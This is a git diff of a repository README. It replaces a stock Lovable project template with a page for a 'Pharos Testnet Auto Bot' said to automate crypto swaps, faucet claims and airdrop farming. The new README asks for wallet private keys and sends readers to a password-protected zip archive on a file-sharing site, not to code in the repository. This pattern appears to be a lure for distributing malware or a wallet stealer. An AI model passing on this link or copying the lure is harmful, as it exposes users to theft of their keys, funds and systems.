@@ -1,73 +1,50 @@
-# Welcome to your Lovable project
+# Pharos Testnet Auto Bot
 
-## Project info
+An automated bot for interacting with the Pharos Testnet, performing swaps, transfers, faucet claims, and daily check-ins to potentially qualify for airdrops.
 
-**URL**: https://lovable.dev/projects/b232cdb7-48ed-4140-9f81-78c9ee728945
+## Features ✨
 
-## How can I edit this code?
+- **Automated Swaps**: Performs random swaps between WPHRS and USDC tokens
+- **PHRS Transfers**: Sends small amounts of PHRS to random addresses
+- **Faucet Claims**: Automatically claims testnet tokens from the faucet
+- **Daily Check-ins**: Completes daily check-in tasks for potential rewards
+- **Proxy Support**: Rotates proxies for each operation (if provided)
+- **Multi-wallet Support**: Processes multiple wallets sequentially
 
-There are several ways of editing your application.
+## Prerequisites 📋
 
-**Use Lovable**
+- Node.js (v18 or higher)
+- npm or yarn
+- Pharos Testnet wallet with private keys
+- (Optional) Proxy list in `proxies.txt`
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/b232cdb7-48ed-4140-9f81-78c9ee728945) and start prompting.
+# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+## PASSWORD: 1322
 
-Changes made via Lovable will be committed automatically to this repo.
+## Usage 🚀
 
-**Use your preferred IDE**
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The bot will:
+1. Display a banner with project info
+2. Load proxies (if available)
+3. Process each wallet sequentially:
+   - Claim faucet (if available)
+   - Perform daily check-in
+   - Execute 10 PHRS transfers
+   - Execute 10 token swaps
+4. Repeat every 30 minutes
 
-Follow these steps:
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+## Support 💬
 
-# Step 3: Install the necessary dependencies.
-npm i
+For issues or questions, please open an issue on GitHub.
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
+## Disclaimer ⚠️
 
-**Edit a file directly in GitHub**
+This software is provided "as is" without warranties. Use at your own risk. The developers are not responsible for any losses or issues caused by using this bot.
 
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
+## License 📄
 
-**Use GitHub Codespaces**
-
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
-
-## What technologies are used for this project?
-
-This project is built with:
-
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
-
-## How can I deploy this project?
-
-Simply open [Lovable](https://lovable.dev/projects/b232cdb7-48ed-4140-9f81-78c9ee728945) and click on Share -> Publish.
-
-## Can I connect a custom domain to my Lovable project?
-
-Yes, you can!
-
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
-
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
+MIT License - See LICENSE file for details
